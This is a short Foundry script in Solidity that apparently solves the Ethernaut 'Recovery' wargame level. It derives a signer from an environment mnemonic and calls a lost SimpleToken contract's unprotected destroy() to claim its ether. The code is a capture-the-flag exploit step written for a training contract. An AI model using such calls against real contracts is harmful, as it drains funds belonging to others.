// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { ISimpleToken } from "ethernaut/17-recovery/ISimpleToken.sol";

contract RecoveryScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address simpleTokenAddr = vm.envAddress("L17_SIMPLE_TOKEN_ADDRESS");
        ISimpleToken simplyToken = ISimpleToken(payable(simpleTokenAddr));

        // Step 1: destroy `SimpleToken` to claim 0.001 ether
        simplyToken.destroy(payable(vm.addr(deployerPrivateKey)));

        vm.stopBroadcast();
    }
}
